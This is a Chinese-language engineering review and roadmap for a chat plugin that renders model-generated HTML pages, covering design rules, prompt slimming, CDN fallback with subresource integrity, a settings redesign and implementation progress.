#### G5 用通用版式原则替换行程偏重的规范
常驻规范只保留以下内容，约 1.5k 字符：
1. **主角**：每个页面有且只有一个视觉主角（大数字、主图、地图或主图表），占首屏面积 ≥ 30%
2. **三级层级**：标题 `xl` / 正文 `base` / 说明 `sm`，说明文字不小于 12px；数字和标签上下分层
3. **留白**：容器内边距 ≥ 16px，区块间距 24–32px；同组元素用间距分组，少用边框
4. **颜色**：页面最多“1 个主色 + 中性色 + 语义色”；主色只用在主操作、选中态、关键数据上
5. **状态**：空状态、加载、错误、示例数据都使用宿主提供的组件（`.iui-empty`、`.iui-skeleton`、`.iui-badge-sample`）
6. **中文排版**：中英文之间加空格，标点不出现在行首，长数字用千分位
7. **主操作**：每个页面最多一个主按钮，用主色，最小高度 36px，放在内容流的自然终点

#### G6 系统提示词瘦身与分层注入
- **实测**：`GENUI_SECTION_TEXT` 有 **12,918 字符**（约 3.5k token），每一轮都会注入，问候和简单问答也不例外
- 内容多、规则多（几十条 HARD / NEVER）会分散模型的注意力，行程类内容也会让非旅行页面带上行程的影子
- **改法**：
  - **常驻部分**只放 fence 契约、bridge 和 G5 原则，控制在 ≤ 3k 字符
  - **按意图注入**：用已有的 `classifyIntentAsk`（13 个意图）命中后，只注入对应的模式和 starter
  - 每个模式附 1 个高质量范例的“结构摘要”，不放完整代码
- **验收**：黄金集上可运行率不下降，F25 品味分提升，平均输入 token 下降 ≥ 50%

### 二、会话内易用性

#### G7 什么时候该生成页面
- **现状**：13 个意图全部是 `must_fence`，规则是“Any visual/interactive ask → emit”。用户只想要一个结论时，也会收到一个页面
- **改法**：
  - 设置项“界面生成积极度”：克制 / 均衡（默认）/ 积极
  - “均衡”模式下，解释类、对比类问题先用文字回答，并在末尾附上宿主渲染的 “▶ 做成可交互页面” 按钮（宿主组件，不占模型输出）
  - 规则：页面不重复正文内容；正文给结论，页面负责探索和操作

#### G8 滚动与手势冲突
- **现状**：只有 starter 模板里设置了 `scrollWheelZoom:false`，宿主不强制。模型自己写的地图会吞掉聊天的滚轮，用户“滚着滚着就被地图卡住”
- **改法**：
  - 宿主在 Leaflet 加载后执行 `L.Map.mergeOptions({scrollWheelZoom:false})`
  - 点击地图后才启用滚轮缩放，并显示“按住 Ctrl/⌘ 缩放”提示；触屏端用双指拖动
  - 页面不可滚动时，iframe 内的 wheel 事件交还给聊天页滚动
  - 横滑区域设置 `overscroll-behavior-x: contain`

#### G9 多个页面同时存在时的资源管理
- **现状**：没有 `IntersectionObserver` 或可见性处理。一个会话里有 10 个页面时，所有动画、定时器和地图都在同时运行
- **改法**：
  - 页面滚出视口时，宿主发送 `visibility:hidden`，bridge 暂停 rAF、`createTripAnimator`、CSS 动画（`animation-play-state`）和媒体播放
  - 超过 6 个活跃页面时，最早的页面冻结成截图（复用快照能力），点击后再激活
- **验收**：长会话滚动保持 60fps，后台 CPU 接近 0

#### G10 即时微调面板（不经过模型）
- 页面的 ⋯ 菜单里加入“外观”：主色（6 个预设加取色器）、密度（紧凑 / 标准 / 宽松）、字号（S / M / L）、圆角、深浅色
- 所有选项都直接改 CSS 变量，**实时生效、零 token**；也能顺带解决“字太小”的问题
- “设为我的默认风格”：保存后注入后续页面的令牌，并在提示词里加一行“用户偏好：主色 …，密度 …”
- 这是迭代成本最低的手段，和 F24 互补：小改动用面板，结构性改动交给模型

#### G11 页面结果回到对话
- 提供标准组件 `<button data-iui-send="summary">`：把页面的当前状态（表单值、选中项）整理成一段可读摘要，**填入输入框**并显示预览，由用户确认后发送（与 F3 一致）
- 让“页面里做了选择，助手能接着聊”变成一个明确、可预期的交互

#### G12 分享为图片
- ⋯ 菜单加入“保存为图片”：在沙箱内截取当前页面生成 PNG（可选长图）。跨域图片需要通过宿主代理获取，否则截图会出错
- 适合小红书、微信等以图片为主的分享场景，比分享 HTML 更符合国内用户习惯

#### G13 可发现性与下一步建议
- 新会话显示 3–4 个示例提示 chip（按最近常用意图）
- 页面生成后，宿主在页面下方显示 2–3 个“继续修改”建议，例如“换成深色”“加一个筛选”“做成手机版”；根据意图静态配置，不消耗模型 token
- 模板抽屉支持搜索和按意图筛选

#### G14 移动端与触屏
- 窄屏下工具栏只显示 ⋯，默认提供“全屏打开”
- 规范禁止“只能 hover 才能看到”的信息；点击区域最小 32px（F23）
- 地图和横滑区域的手势冲突处理见 G8

### 三、品味的质量闭环

#### G15 线上运行时自检（F25 的线上版本）
- 在 `authorSettled` 后，bridge 在页面空闲时做一次轻量检查：
  - 最小字号
  - 正文抽样对比度
  - 横向溢出
  - 空白的 canvas
  - 加载失败的图片
  - 控制台错误
  - 大面积空白
- 有严重问题时，在页面角落显示“发现 2 处排版问题 · 一键优化”，点击后用 F9 的模板发给模型；**不会自动发送**
- 检查结果同时上报给本地统计（G16）

#### G16 用户反馈与本地统计
- 页面 ⋯ 菜单里加入 👍 / 👎；👎 时可选原因：“难看 / 看不清 / 不能用 / 不是我要的”
- 结合 G15 的自检数据存在本地；用户同意后可以匿名导出，用来调整模板和规则，形成“规则 → 生成 → 反馈”的闭环

### 四、建议排期（插入原路线）

| 时机 | 内容 | 理由 |
|---|---|---|
| **.28 “品味快赢”** | G1、G2 对比度与字体、G3、G8 | 基本只改规则、令牌和宿主默认值，成本低、见效快 |
| **0.14** | G2 主色与令牌、G4、G5、G6、G7、G9、G10 | 设计系统 2.0 加提示词重构，需要用黄金集回归 |
| **0.15** | G11、G12、G13、G14、G15、G16 | 交互闭环与数据闭环 |

**依赖关系**：
- G6（提示词分层）要在 G5 之后做
- G10（微调面板）依赖 G2 的令牌化，没有统一的变量就无从调整
- G15 依赖 F25 的规则集


---

## 第四轮 · CDN 专项与设置功能专项审查

> 本轮重新逐行检查了资源加载链路和设置功能，并用 Playwright 做了 3 项实测（脚本：`/tmp/g1.mts`、`/tmp/g1run.mjs`、`/tmp/g2.mts`、`/tmp/g2run.mjs`）。

### 实测结果摘要

| 实测 | 结果 |
|---|---|
| CDN 卡住 6 秒时，页面内容何时可见 | **6443ms 后才出现**：同步 `<script src>` 阻塞了整个页面渲染 |
| 宿主深色 / 系统浅色（及反向组合） | 页面颜色**只跟随系统，不跟随宿主**：宿主深色时，聊天里会出现一张白色卡片 |
| 设置 → 外观覆盖（强调色红、大圆角、紧凑） | 按钮和卡片的计算样式**与默认完全相同**，对 iui-html 页面**没有任何效果** |

---

### A. CDN 与资源加载（C1–C11）

**现状地图**：同一批库的地址散落在 5 处，而且混用了多家 CDN。

| 位置 | 用途 | CDN |
|---|---|---|
| `src/shared/html-sandbox.ts` L2523–2563 | srcdoc 构建时按正则判断需要哪些库，并写入 `<head>` | jsdelivr（Chart 4.4.1、ECharts 5.5.1、Leaflet 1.9.4、d3 7.9.0、AG Grid 32.3.3、Mermaid 11.4.1） |
| `src/shared/author-js-runtime.ts` L204–210 | 重跑时的 `ensureLibs` | jsdelivr（重复定义了一份） |
| `src/themes/oiu-design-system.ts` L592–599 | importmap：three / gsap / d3 / chart.js | **esm.sh，未锁版本** |
| `src/shared/map-embed.ts` L103–106、内置示例 L2774 | 旧版地图组件和示例 | unpkg |
| `HTML_SANDBOX_CDN_ALLOWLIST` | CSP 白名单 | jsdelivr、cdnjs、esm.sh、unpkg、skypack（后两家宿主自己并不用） |

#### C1 同步脚本阻塞渲染（已实测，P0）
- **现象**：库以同步 `<script src>` 的方式写在 `<head>` 里。CDN 一慢，HTML 和 CSS 都不显示，整页空白。CDN 卡住 6 秒时，内容在 6.4 秒后才出现。国内访问 jsdelivr 时常就是这种情况，这正是“白屏”的直接原因
- **修复**：
  - `<head>` 里不再写同步库标签，统一交给运行时的 `ensureLibs` 异步加载（这套机制已经存在）
  - HTML 和 CSS 立即渲染；依赖库的区域显示骨架屏，库就绪后再执行 author JS
  - 删除 srcdoc 构建时的那份重复注入逻辑
- **验收**：CDN 卡住时，静态内容在 300ms 内可见，库所在区域显示“正在加载图表库…”

#### C2 统一资源注册表
- 新建 `src/shared/lib-registry.ts`，作为唯一的数据源：
  ```ts
  { name:'leaflet', version:'1.9.4', js:'dist/leaflet.js', css:['dist/leaflet.css'],
    global:'L', integrity:{js:'sha384-…', css:'sha384-…'}, size: 147_000 }
  ```
- 加载、CSP、importmap、提示词里的 CDN 说明、starter 模板、map-embed 全部从注册表生成，删掉手写的 URL
- 写一个单测：扫描 `src/`，如果在注册表之外出现 CDN 的 URL 字面量，测试就失败

#### C3 importmap 未锁版本（P1）
- `three` / `gsap` / `d3` 指向 `https://esm.sh/three`，也就是**最新版**。上游一发大版本，3D 页面可能突然坏掉，而且同一段代码在不同时间运行结果不同
- **修复**：锁定到具体版本，例如 `three@0.169.0`、`gsap@3.12.5`、`d3@7.9.0`，再加 `?bundle` 减少请求瀑布；版本统一由注册表管理

#### C4 加载超时与“假失败”
- 新插入的脚本只监听 `onerror`。CDN 卡住、既不成功也不报错时会一直等，**没有超时**
- 脚本已经存在时，只轮询 125×40ms（约 5 秒）。库在第 8 秒才加载完，也会被判定为失败，弹出“CDN 加载失败”条带
- **修复**：
  - 每个库单独设置超时（默认 8 秒，可配置）
  - 超时后切换到下一个源（C5）
  - **晚到的成功**会自动清掉失败条带，并补跑挂起的 author JS
  - 失败条带写明具体的库、当前用的源，以及“切换源重试”

#### C5 多源回退与镜像预设
- 回退链：`local（插件自带）→ 国内镜像 → 全球 CDN`，按设置项 `cdnPreset` 决定顺序
  - **global**：jsdelivr → unpkg
  - **china**：npmmirror（`registry.npmmirror.com/<pkg>/<ver>/files/<path>`）→ staticfile / bootcdn（cdnjs 镜像路径）→ jsdelivr
  - **local**：插件本地 → 其余回退
  - **custom**：用户填写模板 `https://my.cdn/{name}@{version}/{file}`
- 每个源都要在 CSP 白名单里（由注册表生成）

#### C6 复用插件已有的本地资源路由（关键，成本低）
- **现状**：插件**已经有** node 端静态路由 `/plugins/@losebird/iui/assets/*`（`src/plugin/index.ts` 中的 `serveGenuiAsset`），并且打包了 mermaid、three、echarts 给旧的 GenuiBlock 使用。但**主产品 iui-html 沙箱完全没用到它**，仍然全部走海外 CDN
- **修复**：
  1. 构建时从 `node_modules` 把注册表里的库（锁版本）复制到 `lib/assets/vendor/<name>@<ver>/`
  2. `ASSET_FILE_RE` 目前只允许 `.js`，需要扩展到 `.css`、`.mjs`、字体和图片，并加上 `Cache-Control: immutable, max-age=31536000`
  3. CSP 的 `script-src` / `style-src` 加入宿主自身的 origin。srcdoc 继承父页面的 base URL，相对路径 `/plugins/...` 可以直接解析。null origin 的页面加载经典脚本不需要 CORS；module 脚本需要路由返回 `Access-Control-Allow-Origin: *`（**需要 Playwright 验证**）
  4. 体积：全部库大约 6–9MB。可以拆出一个可选包 `@losebird/iui-vendor`，主包只带 Leaflet、Chart.js、Mermaid 这几个高频库
- **验收**：断开外网后，地图（瓦片除外）、图表、表格、脑图、3D 都能正常渲染

#### C7 供应链安全（SRI）
- 目前所有 CDN 引用都没有 `integrity`。CDN 一旦被投毒，恶意脚本就会在沙箱里拿到 appData 和 bindings（和 F4 叠加）
- **修复**：注册表里存 `sha384`，加载时带上 `integrity` 和 `crossorigin="anonymous"`；本地 vendor 由插件包本身的完整性保证

#### C8 模型自己写的 CDN 地址会绕过所有配置
- 提示词允许模型直接写 jsdelivr、cdnjs、esm.sh、unpkg 的标签，这些地址不会经过镜像、本地和 SRI
- **修复**：
  1. **提示词**：不要写 CDN 标签，改为在 fence 里声明 `"libs":["leaflet","chart.js"]`，由宿主负责加载
  2. **重写层**：在净化阶段识别 `cdn.jsdelivr.net/npm/<pkg>@<ver>/…`、`unpkg.com/<pkg>@<ver>/…`、`cdnjs.cloudflare.com/ajax/libs/<pkg>/<ver>/…`、`esm.sh/<pkg>@<ver>`，以及 `import('…')` 和 importmap 里的地址。注册表里有的库改写到当前的源；没有的保留原地址，并在控制台提示
  3. 同一个库、不同版本时，统一使用注册表版本（major 不同时保留原版本）

#### C9 按正则判断“需要哪些库”会误判
- 例如：`id="map"` 就会加载 Leaflet（约 150KB）；源码里出现 `Chart` 加上 `line` 字样就会加载 Chart.js（约 200KB）
- **修复**：优先使用 `libs` 字段；正则只作为兜底，并且只匹配真实的 API 调用（如 `L.map(`、`new Chart(`）

#### C10 瓦片、图片、地理编码在国内的可达性
- 瓦片源全在海外：Esri（默认）、Carto、OSM（及 osm.fr），而且提示词把 Esri 写成了 REQUIRED
- **Wikipedia / Wikimedia 在中国大陆基本不可达**，而图片又是 REQUIRED：
  - 服务端工具每次要等满 8 秒超时，行程类回复因此平白多出约 8 秒
  - 页面运行时每张图还要再等 5 秒
- Nominatim 地理编码同样在海外
- **修复**：
  - **启动时探测连通性**：插件 node 端并发 HEAD 请求 jsdelivr、npmmirror、upload.wikimedia.org、tile 源，每个超时 2 秒，结果缓存 1 小时，并写入 runtime-config
  - `cdnPreset=auto` 时根据探测结果自动选源
  - Wikimedia 不可达时，跳过图片工具和运行时查询，直接用 G1 的设计化占位，并把提示词里的 REQUIRED 降为可选
  - 国内瓦片：高德或天地图（需 key）；做 GCJ-02 和 WGS-84 坐标转换（宿主侧处理 `L.marker` 坐标）
  - 地理编码：可选高德 / 天地图地理编码，或者只用模型给出的坐标

#### C11 缓存与预连接
- 在 srcdoc 里加 `<link rel="preconnect">`（指向当前源）
- 本地 vendor 使用 immutable 缓存
- **需要验证**：null origin 的 iframe 在 Chromium 分区缓存下，能否跨 iframe 共享 HTTP 缓存。如果不能，考虑由宿主取回内容，再以 `blob:` 的形式注入（只对高频库这样做）

---

### B. 设置功能（S1–S12）

**现有设置项和实际作用**（逐项追踪了读取位置）：

| 设置项 | 实际效果 | 结论 |
|---|---|---|
| 主题 themeId | 只有一个主题 `iui-default` | **没用**（下拉框里只有一项） |
| 外观覆盖：强调色 / 圆角 / 密度 | 写入 `--dsl-g-*`，沙箱 CSS 中只用到一次 `--dsl-g-fg` | **对 iui-html 页面没有效果（已实测）** |
| 自定义 token JSON | 合并进宿主 tokens 并推送给沙箱；必须手写 `--color-*` 才会生效，但没有文档 | 部分有用，门槛高 |
| 用户模板 JSON | 只在设置页里能预览和插入；**模板抽屉只读内置模板** | 基本没用；提示文案还要求使用旧的 ```iui 格式 |
| 围栏修复反馈 | 服务端会在同一轮自动追加一次修复请求 | 有用，但会额外消耗 token，而且用户看不到 |
| 格式裁判 | 关闭后只停掉纠偏；**系统提示里的裁判规则仍然注入**（`GENUI_SECTION_TEXT` 在导入时就生成了） | 只关掉了一半 |
| Jev 路由与密钥 / URL / 模型 | 调用第三方服务来决定输出格式 | 有效，但面向普通用户过于技术化，存在隐私风险（F17） |
| Structured Outputs 及探测 URL / 密钥 | 自己的提示文案写着 “dsh cannot attach response_format on LlmCallConfig”：只计算并公布 schema，**不会附加到请求上** | **对生成没有效果** |

#### S1 外观覆盖不生效（已实测，P0 级体验问题）
- `token-overrides.ts` 写的是 `--dsl-g-accent`、`--dsl-g-radius-*`、`--dsl-g-gap-*`（旧组件树的令牌），而沙箱页面用的是 `--color-*` 和 `--iui-pack-*`
- **修复**：
  - 合并成**一套令牌**。目前至少有 5 套并存：`--color-*`、`--iui-pack-*`、`--dsl-g-*`、`IUI_TOKEN_CATALOG`、`--iui-chart-*`，以 G2 为准
  - 外观控件改为写 G2 令牌，例如强调色 → `--accent` 的整个色阶，同时映射 `--iui-pack-accent` 和 `--color-text-info`
  - 已经打开的页面通过 theme 消息即时更新（链路已存在）
- **验收**：在设置里改强调色后，聊天里已有页面的主按钮、链接、图表主色同步变化

#### S2 深色模式跟随系统，而不是宿主（已实测）
- 设计系统 CSS 用的是 `@media (prefers-color-scheme: dark)`；宿主推送的深色 tokens 是 `--dsl-g-*`，不会影响 `--color-*`
- **修复**：
  - theme 消息里加入 `scheme: 'dark'|'light'`
  - CSS 改为 `:root[data-iui-scheme="dark"]`，构建 srcdoc 时就写好初始值，并设置 `color-scheme`
  - 宿主用 MutationObserver 监听 `body[data-ds-dark-theme]` 的变化。目前 `readDesignTokens` 只订阅了主题变化，没订阅宿主深浅色的切换，也要一起补上
  - 同时触发 G3 的图表重新上色

#### S3 设置预览用的是已经删除的旧组件
- `SETTINGS_PREVIEW_SPEC` 是 stat / progress / card 组件树，由 `GenuiBlock` 渲染，和真实的 iui-html 页面长得完全不一样
- **修复**：预览改成一个真实的沙箱页面（迷你看板：KPI、按钮、图表、卡片、表单），并且深浅色并排显示

#### S4 主题选择形同虚设
- 二选一：删除主题选项；或者落地 G2 / D 的“页面性格预设”（工具 / 内容 / 数据 / 玩具），每个预设对应一套真实的令牌

#### S5 设置模型与 schema 脱节，存在崩溃风险
- `IuiSettingsCardController` 注册了 schema 里**不存在**的字段：`packId`、`gatewayMode`、`gatewaySidecarUrl`、`instanceStorePersist`、`instanceStorePersistPath`、`frameChannelMount`
- i18n 里的介绍还写着“为气泡 ```iui 围栏选择组件包”，Gateway、frames.sse 等文案也都是已删除功能的
- 结合 F14：设置页依赖 primitives 新版本才有的 `SettingsFormModel` 等导出。在锁定的旧宿主上，external 会解析成 `undefined`，`new SettingsFormModel(...)` 会抛 TypeError，**设置页可能直接打不开（需要在宿主上验证）**
- **修复**：
  - 设置 UI 由 `Config` schema 自动生成字段列表（单一数据源），删掉已下线的字段和文案
  - 对 primitives 做特性检测，缺失时退回一个只读的“请升级宿主”卡片
  - 新增集成测试：schema 字段集合必须与 UI 字段集合相等

#### S6 用户模板闭环
- 模板抽屉合并显示“我的模板”，格式统一为 iui-html
- 页面 ⋯ 菜单加入“保存为模板”，一键保存当前页面的源码和状态，取代手写 JSON
- 模板支持导入和导出（`.json`）

#### S7 自定义 token 的易用性
- 默认收进“高级”；保存时按令牌目录校验 key，未知的 key 标黄提示
- 提供可用变量的列表和示例；日常调整交给 G10 的可视化面板

#### S8 行为开关要说清楚，并且真正生效
- “格式裁判”关闭后，系统提示里也不再注入裁判块：section 改为按 live config 动态生成，而不是导入时的常量
- 自动修复和纠偏发生时，在回复下方显示一个小标记“已自动修复 1 次”，并说明会额外消耗 token
- 删除每次启动都会执行的调试写文件 `writeFileSync('/tmp/iui-system-section.txt')`（`src/plugin/index.ts` L381），或改为只在 `IUI_DEBUG` 环境变量开启时执行

#### S9 Structured Outputs 和 Jev 的处理
- 在宿主能附加 `response_format` 之前，Structured Outputs 移到“开发者”分组，默认隐藏，并注明“当前宿主不支持，不影响生成”
- Jev 移到“开发者 / 实验”分组，打开时提示“会把你的问题发送给第三方 TypeSafe”

#### S10 设置同步方式
- `startRuntimeConfigWatch` 每 2.5 秒轮询一次 `runtime-config.json`，没有页面时也一直在跑（这是第三个常驻轮询）
- **修复**：只在保存后、页面可见性变化时刷新；或者复用 bindings 的 SSE 通道推送配置变更

#### S11 保存后的生效范围
- 外观类设置（S1、S2）实时推送给所有已打开的页面
- 行为类设置只对新消息生效，并在保存按钮旁注明这一点

#### S12 设置的信息架构重排（加入方案中新增的配置）

| 分组 | 设置项 |
|---|---|
| **外观** | 页面风格预设、强调色、圆角、密度、字号、深浅色（跟随宿主 / 强制）、减少动效 |
| **生成** | 界面生成积极度（G7）、自动修复（原“围栏修复反馈”）、格式纠偏（原“格式裁判”）、页面里的发送行为（只填入输入框 / 确认后发送） |
| **网络与资源** | CDN 源（auto / china / local / global / custom）、地图瓦片源与 key、实景图片（自动 / 关闭）、连通性检测结果与“重新检测” |
| **隐私与安全** | 严格图片策略（F4）、页面数据访问范围、清除页面存储（F10 / F18） |
| **模板** | 我的模板（列表、导入导出） |
| **开发者** | 自定义 token JSON、旧版 fence 兼容（F16）、Structured Outputs、Jev 路由、调试日志 |

---

### C. 本轮排期调整

| 版本 | 新增内容 |
|---|---|
| **.27 热修** | C1（同步脚本阻塞，改动小、收益大）、C4（超时与假失败）、S5 的崩溃防护（与 F14 一起） |
| **.28** | C2、C3、C5、C6、C7、C10 的连通性探测、S1、S2、S8、S10 |
| **0.14** | C8、C9、C10 的国内瓦片与坐标转换、C11、S3、S4、S6、S7、S9、S11、S12 |

> 原 F19 的内容并入 C 系列；原 F14 与 S5 一起处理。

---

## 第 5 轮（调研）：对标 motionsites.ai 的视觉与交互

样本：抽查 22 段预览视频（Specimen、Feathers/Abyss Atlas、Go On/Scarab、Octo、FinSmith、Design World、Fin Coin、Monolithic、Cosmic Mapping、Moss Valley、Ancient Oath、Sky Cookie、Jelly Garden、Peculiar Atelier、Agehana、Michelle、SynapticForge、Golden Identity、Orla、Inknomad、Shadow 3D）。另有几类区块卡片只看了标题：Liquid Glass、Keylight Auth、Pricing、Footer、SaaS。

### 效果分类与 IUI 能做到的程度
| 类 | 代表 | 核心手法 | IUI 能做到的程度 |
|---|---|---|---|
| A 3D 主体 × 巨型字 | Go On、Octo、FinSmith、Fin Coin | GLB 夹在文字层前后，光标/拖拽转动，主体有循环动画 | 宿主 3D 舞台 + 前后文字层就能做；卡点在高质量模型 |
| B 3D 图鉴查看器 | Specimen、Feathers、Abyss | 三栏图鉴，360°、近景，切换物种时镜头飞过去 | 能做；需要 atlas starter 和 CC0 模型 |
| C 电影感滚动 | Monolithic、Cosmic、Moss Valley、Ancient Oath、Sky Cookie | 预渲染视频或序列帧随滚动播放，配大字转场 | 气泡内改用拖拽/进度条/视口驱动；画面全靠素材（视频或图片） |
| D 物理 / WebGL 玩具 | Jelly Garden、Peculiar Atelier | 软体抖动、布料、刀切；用着色器 | 做成宿主预设（cloth/jelly/ripple）；不能让 LLM 每次手写 |
| E 光标跟随 / 视差 | Agehana、Michelle、SynapticForge、Golden Identity | 分层视差，3D 头部跟着光标转 | 能做：视差预设，手机上改用陀螺仪或自动漂移 |
| F 编辑式 / 奢华排版 | Orla、Monolithic、Golden Identity、Ancient Oath | 衬线展示字、超大留白、发丝线、规格表 | 能做：风格包 + 打包字体 |
| G 游戏菜单 HUD | Inknomad | mono 小字，编号菜单，角色居中 | 能做：风格包 hud |
| H 材质 / 区块 | Design World 玻璃、Liquid Glass、Auth/Pricing/Footer | 折射材质，backdrop-filter，区块套件 | CSS 部分能做；折射用 MeshPhysicalMaterial 预设 |

### 约束
- 载体是聊天气泡（手机 360–760px），不是全屏落地页。滚动叙事要换成容器内的交互方式。
- 惊艳感大半来自定制素材（AI 渲染的模型和视频）。IUI 要靠素材检索（CC0 模型/视频，或用户提供）。
- 性能：同屏最多 1 个 WebGL 上下文；不在视口内就暂停；尊重 prefers-reduced-motion；手机降级。
- token：复杂效果全部做成宿主预设，LLM 只写声明式配置。

### 建议顺序（R5）
- R5-0 修复 4 个截图缺陷（图表系列配色、地图接缝、行程头部 chip、Leaflet 字体）
- R5-1 风格包 2.0：editorial/atlas、luxury、poster（巨型字）、hud、glass、pop；打包 OFL 字体（衬线展示、窄体、mono），中文回退到系统宋体/黑体；同时做区块套件（hero/feature/pricing/auth/footer/cta）。依赖 G4 Lucide 图标
- R5-2 动效预设 iui.motion：reveal/stagger、文字拆分、marquee、容器内 scrub、指针视差/倾斜（陀螺仪兜底）、磁吸按钮
- R5-3 宿主 3D 舞台：GLB 加载、自动取景、阴影、手势、热点飞镜头、动画片段、文字前后层、lookAt 光标；外加 CC0 模型检索工具
- R5-4 WebGL 预设：cloth、jelly、shader 背景（mesh gradient、noise、tunnel）、粒子、玻璃材质
- R5-5 媒体 scrub：视频/序列帧随拖拽或视口播放，海报帧兜底；视频素材检索
- R5-6 starters（atlas、poster、product-showcase）+ pattern notes + 每种风格的视觉门禁基准

### 进度（第 5 轮实施，分支 hotfix/0.13.0-iui.27）
- R5-0 截图缺陷 ✅；R5-1 默认精致层 + 帧内动效运行时 ✅；R5-2 视觉修正（分段控件、磨砂地图控件、强调色选中态、中性次按钮、平面嵌套面板、折线图细化）✅
- G4 本地 Lucide 图标 ✅：130 个图标随页面内联（无 CDN，ISC，见 NOTICE），`<i data-iui-icon="map-pin">` / `<use href="#i-…">`，别名与驼峰名自动解析，只有用到图标的页面才注入运行时；天气 starter 与 referee 配方不再用 emoji
- 常驻提示词精简 ✅（离线）：4,583 → 3,467 字符（-24%）。去掉宿主已强制的规则（字号层级、内边距、卡片底色、按钮尺寸、图表宽高比），改为"宿主已负责排版/按钮/表单/卡片/图表/地图/暗色/动效，只写布局 CSS"；iui-patch 语法只在按需的 `[iui-current-page]` 提示里给出；宿主补上常见猜测变量别名（--bg/--surface/--card/--text/--fg/--muted/--border/--radius）。线上 A/B（黄金集质量 + 输出 token）放到全部修复完成后统一跑
- G7 UI 积极度 ✅：设置 `uiEagerness`（克制 / 平衡〔默认〕/ 积极）；平衡模式下解释、对比类问题用文字回答，行程、天气、地图、仪表盘仍出页面；最新一条文字回答下出现「做成可交互页面」小按钮，点击只填入输入框，由用户自己发送（不发送就零 token）
- G9 长对话减负 ✅：页面滚出视口（200px 余量，1.5 秒后）暂停 rAF / setInterval / CSS 与 Web 动画 / 视频，滚回自动恢复；超过 6 个活页面时，离开视口最久的冻结成静态快照（去脚本、canvas 转图片、保留表单值），显示「已暂停以节省资源 · 点击恢复」，点击按已存状态重新运行；WebGL 页面只暂停不冻结
- G10 页面外观 ✅：⋯ →「外观」面板（强调色 6 预设 + 自定义、密度、字号、圆角、浅/深/跟随），实时生效不重生成；Chart.js / ECharts 坐标轴与系列同步换色，作者写的 `prefers-color-scheme` 规则和 matchMedia 监听跟随强制配色；随页面持久化、带进下载文件；「设为我的默认风格」→ 新页面默认使用，并在 UI 类请求时给助手一行 `[iui-style]` 提示
- G11 摘要发送 ✅：`<button data-iui-send="summary">` 把页面当前选择（输入、下拉、勾选 chip、按下的切换按钮）整理成可读摘要填入输入框并提示，不自动发送
- G12 保存为图片 ✅：⋯ →「保存为图片」，帧内自绘（canvas、CSS 背景、渐变、表单值）；读不到的图片/样式由宿主代取（先直连 CORS，再走插件 `proxy` 路由：仅 http(s)，拒绝内网/回环/链路本地地址及跳转到这些地址，≤3 次跳转、8 秒、≤8MB、只放行 image/* 与 text/css；单次导出 30 秒 / 300 次 / 40MB 预算）；仍失败的图片用同尺寸灰色占位并在菜单提示数量
- G13 下一步建议 ✅：最新一个页面下方 2–3 个「继续修改」chip（深色、手机版、筛选、加图表…，按页面类型），空对话时 3–4 个示例（最近常用类型优先，14 天衰减）；只填输入框；模板抽屉加搜索
- G14 窄屏 / 触屏 ✅：卡片 <480px 只留 ⋯（「全屏打开」移进菜单）；触屏工具栏 ≥32px、菜单行 36px；提示词要求点击区 ≥32px、不依赖 hover
- G15 页面自检 ✅：页面稳定 1.5 秒后帧内自检（字号 <11px、对比度 <2.3:1、被宿主裁掉的横向溢出、空白 canvas、坏图、脚本报错、大片空白；SVG 文字与地图除外）；有严重问题时右下角出现「发现 N 处排版问题 · 一键优化」，点击填入修复请求（建议 iui-patch），不自动发送，× 可忽略；全部内置 starter 自检零误报
- G16 反馈闭环 ✅：⋯ 菜单 👍/👎（原因：难看 / 看不清 / 不能用 / 不是我要的）；评价与自检计数只存本浏览器（页面哈希 + 页面类型，不含内容）；设置 →「反馈统计」显示汇总，勾选同意后导出匿名 JSON，可一键清除
- 第四轮 B 设置专项 S1–S12 ✅（Batch D）：设置页按「外观 / 生成 / 网络与资源 / 隐私与安全 / 模板 / 开发者（折叠）」分组；外观直接复用 ⋯ →「外观」控件（旧 `--dsl-g-*` 覆盖与只有一项的主题下拉移除），改动实时推送已打开页面，右侧浅色 + 深色两个真实沙箱页面预览；配色「跟随宿主」改为跟随 dsh 明暗而不是系统；⋯ →「保存为模板」→ 模板抽屉「我的模板」（试用 / 复制 / 删除）+ 设置页列表导入导出（v2 JSON，旧 demo 条目跳过并提示），内置模板指令改为 ```iui-html；自定义资源 URL 与自定义 token 即时校验（未知 token 标黄、不安全值丢弃）；Jev 第三方隐私警告；Structured Outputs 标明当前宿主不生效；显示自动修复 / 格式纠偏次数并说明每次多一轮模型调用；绑定字段表与配置 schema 共用（有测试），旧宿主显示升级提示卡；运行时配置改为可见/聚焦 + 60 秒刷新（去掉 2.5 秒轮询）；系统段调试导出仅在 `IUI_DEBUG=1` 时写到临时目录。注：「每条回复标注已自动修复」需要宿主提供回复级提示位，当前宿主无此接口，改为设置页计数
- 第四轮 A CDN 专项 C2 / C7 / C9 / C10 / C11 ✅（Batch E）：
  - C2 单一注册表：CDN 地址与版本只在 `vendor-registry.ts` 出现（运行时默认值、starter、地图嵌入、离线导出、探测都从它生成），测试扫描 src 发现任何 CDN 字面量 / 版本号即失败；顺带修掉 ECharts starter 的 5.5.1 旧版本与地图嵌入的 unpkg 直链
  - C7 SRI：注册表每个文件的 sha384 由 `scripts/vendor-integrity.mts` 从 node_modules 生成（测试校验与 node_modules 一致），所有公共 CDN 候选（jsDelivr / npmmirror / unpkg 返回的就是 npm 原文件）自动加 `integrity` + `crossorigin`，回退切换和运行时加载器逐个 URL 重新套用；three 走 importmap `integrity`；插件自带路由与自定义模板不加。Chart.js 改用 npm 原文件 `chart.umd.js`（原 `.min` 是 jsDelivr 现场压缩，unpkg 直接 404）。作者写的 CDN 标签被改写后，旧 hash 自动去掉。真实 Chromium 验证：三种预设都能带 SRI 加载 Leaflet / Chart / three；故意改坏 hash 后被拦截并回退到 npmmirror / unpkg 正常加载
  - C9 `libs` 声明：头部 `libs: leaflet,chart` 或 JSON `libs` 声明的库必加载；未声明时只认真实 API 调用（`L.map(`、`new Chart(`、`echarts.init(`、`agGrid.createGrid(`、`mermaid.run(` 等），不再因 `id="map"` 或"Chart + line 字样"误加载；流式外壳（JS 未到）仍按标记预加载；提示词只加一句 `libs:`（3,588 字符）
